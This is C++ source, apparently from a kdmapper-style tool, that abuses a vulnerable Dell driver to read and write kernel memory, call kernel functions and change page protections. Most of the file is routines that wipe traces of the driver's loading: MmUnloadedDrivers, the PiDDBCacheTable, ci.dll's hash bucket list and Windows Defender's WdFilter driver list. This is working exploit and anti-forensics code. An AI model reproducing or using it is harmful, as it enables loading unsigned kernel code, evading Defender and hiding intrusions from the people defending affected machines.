uint64_t dell_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(ntoskrnlAddr, "ExAllocatePoolWithTag");
	if (!kernel_ExAllocatePool) {
		kdmLog(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	static ULONG poolTag = RandomPoolTag();
	uint64_t allocated_pool = 0;
	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, poolTag))
		return 0;

	return allocated_pool;
}

bool dell_driver::FreePool(uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(ntoskrnlAddr, "ExFreePool");
	if (!kernel_ExFreePool) {
		kdmLog(L"[!] Failed to find ExFreePool" << std::endl);
		return 0;
	}

	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

/* ══════════════════════════════════════════════════════════════════════
 *  Independent pages + page protection
 * ══════════════════════════════════════════════════════════════════════ */

uint64_t dell_driver::MmAllocateIndependentPagesEx(uint32_t size) {
	uint64_t allocated_pages{};

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

	if (!kernel_MmAllocateIndependentPagesEx) {
		kernel_MmAllocateIndependentPagesEx = dell_driver::FindPatternInSectionAtKernel((char*)".text", dell_driver::ntoskrnlAddr,
			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
			(char*)"xxxxxxxxx????xxx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			kdmLog(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
		kernel_MmAllocateIndependentPagesEx += 8;
		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx) {
			kdmLog(L"[!] Failed to resolve MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
	}

	if (!dell_driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool dell_driver::MmFreeIndependentPages(uint64_t address, uint32_t size) {
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages) {
		kernel_MmFreeIndependentPages = dell_driver::FindPatternInSectionAtKernel("PAGE", dell_driver::ntoskrnlAddr,
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {
			kernel_MmFreeIndependentPages = dell_driver::FindPatternInSectionAtKernel("PAGE", dell_driver::ntoskrnlAddr,
				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
				(char*)"xx????xxxx????xxx");
			if (!kernel_MmFreeIndependentPages) {
				kdmLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
				return false;
			}
			kernel_MmFreeIndependentPages += 9;
		}
		else {
			kernel_MmFreeIndependentPages += 8;
		}
		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages) {
			kdmLog(L"[!] Failed to resolve MmFreeIndependentPages" << std::endl);
			return false;
		}
	}

	uint64_t result{};
	return dell_driver::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN dell_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect) {
	if (!address) {
		kdmLog(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;

	if (!kernel_MmSetPageProtection) {
		kernel_MmSetPageProtection = dell_driver::FindPatternInSectionAtKernel("PAGELK", dell_driver::ntoskrnlAddr,
			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
			(char*)"xx??x???xxx");
		if (!kernel_MmSetPageProtection) {
			kernel_MmSetPageProtection = dell_driver::FindPatternInSectionAtKernel("PAGELK", dell_driver::ntoskrnlAddr,
				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
				(char*)"xx??xx????x???xxx");
			if (!kernel_MmSetPageProtection) {
				kdmLog(L"[!] Failed to find MmSetPageProtection" << std::endl);
				return FALSE;
			}
			kernel_MmSetPageProtection += 13;
		}
		else {
			kernel_MmSetPageProtection += 10;
		}
		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection) {
			kdmLog(L"[!] Failed to resolve MmSetPageProtection" << std::endl);
			return FALSE;
		}
	}

	BOOLEAN set_prot_status{};
	if (!dell_driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;
	return set_prot_status;
}

/* ══════════════════════════════════════════════════════════════════════
 *  Kernel module export resolution
 * ══════════════════════════════════════════════════════════════════════ */

uint64_t dell_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size)) {
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;
	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));
		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) return 0;
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0;
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 *  Trace cleanup — ported from intel_driver with namespace changes
 * ══════════════════════════════════════════════════════════════════════ */

bool dell_driver::ClearMmUnloadedDrivers() {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == nullptr) {
		if (buffer != nullptr) VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;
	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);
	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i) {
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];
		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;
		if (current_system_handle.HandleValue == hDevice) {
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}
	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object) return false;

	uint64_t device_object = 0;
	if (!ReadMemory(object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		kdmLog(L"[!] Failed to find device_object" << std::endl);
		return false;
	}

	uint64_t driver_object = 0;
	if (!ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		kdmLog(L"[!] Failed to find driver_object" << std::endl);
		return false;
	}

	uint64_t driver_section = 0;
	if (!ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		kdmLog(L"[!] Failed to find driver_section" << std::endl);
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };
	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		kdmLog(L"[!] Failed to find driver name" << std::endl);
		return false;
	}

	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
	if (!ReadMemory((uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		kdmLog(L"[!] Failed to read driver name" << std::endl);
		return false;
	}

	us_driver_base_dll_name.Length = 0;
	if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		kdmLog(L"[!] Failed to write driver name length" << std::endl);
		return false;
	}

	kdmLog(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);
	return true;
}

/* ── Helper functions for cleanup ─────────────────────────────────── */

PVOID dell_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG)))
		return nullptr;
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool dell_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	if (!Resource) return 0;
	static uint64_t fn = GetKernelModuleExport(ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
	if (!fn) { kdmLog(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl); return 0; }
	BOOLEAN out;
	return (CallKernelFunction(&out, fn, Resource, wait) && out);
}

bool dell_driver::ExReleaseResourceLite(PVOID Resource) {
	if (!Resource) return false;
	static uint64_t fn = GetKernelModuleExport(ntoskrnlAddr, "ExReleaseResourceLite");
	if (!fn) { kdmLog(L"[!] Failed to find ExReleaseResourceLite" << std::endl); return false; }
	return CallKernelFunction<void>(nullptr, fn, Resource);
}

BOOLEAN dell_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	if (!Table) return false;
	static uint64_t fn = GetKernelModuleExport(ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
	if (!fn) { kdmLog(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl); return false; }
	bool out;
	return (CallKernelFunction(&out, fn, Table, Buffer) && out);
}

PVOID dell_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table) return nullptr;
	static uint64_t fn = GetKernelModuleExport(ntoskrnlAddr, "RtlLookupElementGenericTableAvl");
	if (!fn) { kdmLog(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl); return nullptr; }
	PVOID out;
	if (!CallKernelFunction(&out, fn, Table, Buffer)) return 0;
	return out;
}

nt::PiDDBCacheEntry* dell_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
	nt::PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;
	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
}

/* ── Pattern scanning ─────────────────────────────────────────────── */

uintptr_t dell_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) return 0;
	if (dwLen > 1024 * 1024 * 1024) return 0;

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(dwAddress, sectionData.get(), dwLen)) return 0;

	auto result = kdmUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
	if (result <= 0) return 0;
	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t dell_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr) return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(modulePtr, headers, 0x1000)) return 0;
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)kdmUtils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) return 0;
	if (size) *size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t dell_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
}

/* ══════════════════════════════════════════════════════════════════════
 *  ClearPiDDBCacheTable
 * ══════════════════════════════════════════════════════════════════════ */

bool dell_driver::ClearPiDDBCacheTable() {
	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx");

	if (PiDDBLockPtr == NULL) {
		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x");
		if (PiDDBLockPtr == NULL) {
			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x");
			if (PiDDBLockPtr == NULL) {
				kdmLog(L"[-] Warning PiDDBLock not found" << std::endl);
				return false;
			}
			else {
				PiDDBLockPtr += 19;
			}
		}
		else {
			PiDDBLockPtr += 16;
		}
	}
	else {
		PiDDBLockPtr += 28;
	}

	if (PiDDBCacheTablePtr == NULL) {
		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx");
		if (PiDDBCacheTablePtr == NULL) {
			kdmLog(L"[-] Warning PiDDBCacheTable not found" << std::endl);
			return false;
		}
		else {
			PiDDBCacheTablePtr += 2;
		}
	}

	PVOID PiDDBLock = ResolveRelativeAddress((PVOID)PiDDBLockPtr, 3, 7);
	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)ResolveRelativeAddress((PVOID)PiDDBCacheTablePtr, 6, 10);

	if (!ExAcquireResourceExclusiveLite(PiDDBLock, true)) {
		kdmLog(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}

	auto n = GetDriverNameW();
	auto decryptedCopy = DecryptDriverResource();
	auto timestamp = portable_executable::GetNtHeaders((void*)decryptedCopy.data())->FileHeader.TimeDateStamp;
	SecureZero(decryptedCopy.data(), decryptedCopy.size());
	decryptedCopy.clear();

	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		kdmLog(L"[-] Not found in cache" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	PLIST_ENTRY prev;
	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	if (!WriteMemory((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	ULONG cacheDeleteCount = 0;
	ReadMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	}

	ExReleaseResourceLite(PiDDBLock);
	kdmLog(L"[+] PiDDBCacheTable Cleaned" << std::endl);
	return true;
}

/* ══════════════════════════════════════════════════════════════════════
 *  ClearKernelHashBucketList
 * ══════════════════════════════════════════════════════════════════════ */

bool dell_driver::ClearKernelHashBucketList() {
	uint64_t ci = kdmUtils::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		kdmLog(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}

	auto sig = FindPatternInSectionAtKernel("PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
	if (!sig) {
		kdmLog(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2) {
		kdmLog(L"[-] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress((PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress((PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock) return false;

	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true)) {
		kdmLog(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}

	nt::HashBucketEntry* prev = (nt::HashBucketEntry*)g_KernelHashBucketList;
	nt::HashBucketEntry* entry = 0;
	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(entry))) {
		ExReleaseResourceLite(g_HashCacheLock);
		return false;
	}
	if (!entry) {
		ExReleaseResourceLite(g_HashCacheLock);
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	while (entry) {
		USHORT wsNameLen = 0;
		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			ExReleaseResourceLite(g_HashCacheLock);
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				ExReleaseResourceLite(g_HashCacheLock);
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				ExReleaseResourceLite(g_HashCacheLock);
				return false;
			}

			size_t find_result = std::wstring(wsName.get()).find(wdname);
			if (find_result != std::wstring::npos) {
				nt::HashBucketEntry* Next = 0;
				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
					ExReleaseResourceLite(g_HashCacheLock);
					return false;
				}
				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
					ExReleaseResourceLite(g_HashCacheLock);
					return false;
				}
				if (!FreePool((uintptr_t)entry)) {
					ExReleaseResourceLite(g_HashCacheLock);
					return false;
				}
				kdmLog(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				ExReleaseResourceLite(g_HashCacheLock);
				return true;
			}
		}
		prev = entry;
		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(entry))) {
			ExReleaseResourceLite(g_HashCacheLock);
			return false;
		}
	}

	ExReleaseResourceLite(g_HashCacheLock);
	return false;
}

/* ══════════════════════════════════════════════════════════════════════
 *  ClearWdFilterDriverList
 * ══════════════════════════════════════════════════════════════════════ */

bool dell_driver::ClearWdFilterDriverList() {
	auto WdFilter = kdmUtils::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		kdmLog("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}

	auto RuntimeDriversList = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");

	if (!RuntimeDriversList || !RuntimeDriversCountRef) {
		kdmLog("[!] Failed to find WdFilter patterns" << std::endl);
		return false;
	}

	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?xx???????????x");
	if (!MpFreeDriverInfoExRef) {
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?x???x???????????x");
		if (!MpFreeDriverInfoExRef) {
			kdmLog("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
			return false;
		}
		MpFreeDriverInfoExRef += 0x3;
	}
	MpFreeDriverInfoExRef += 0x3;

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversList, 3, 7);
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversCountRef, 2, 6);
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory(RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress((PVOID)MpFreeDriverInfoExRef, 1, 5);

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* {
		LIST_ENTRY* Entry;
		if (!ReadMemory(Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
	};

	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink)))) {

		UNICODE_STRING Unicode_String;
		if (ReadMemory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), dell_driver::GetDriverNameW().c_str())) {
					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					for (int k = 0; k < 256; k++) {
						PVOID value = 0;
						ReadMemory(RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1);
							WriteMemory(RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
							removedRuntimeDriversArray = true;
							break;
						}
					}
					if (!removedRuntimeDriversArray) return false;

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));
					WriteMemory(uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));

					ULONG current = 0;
					ReadMemory(RuntimeDriversCount, &current, sizeof(ULONG));
					current--;
					WriteMemory(RuntimeDriversCount, &current, sizeof(ULONG));

					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;
					USHORT Magic = 0;
					ReadMemory(DriverInfo, &Magic, sizeof(USHORT));
					if (Magic == 0xDA18)
						CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, DriverInfo);

					kdmLog("[+] WdFilterDriverList Cleaned" << std::endl);
					return true;
				}
			}
		}
	}
	return false;
}
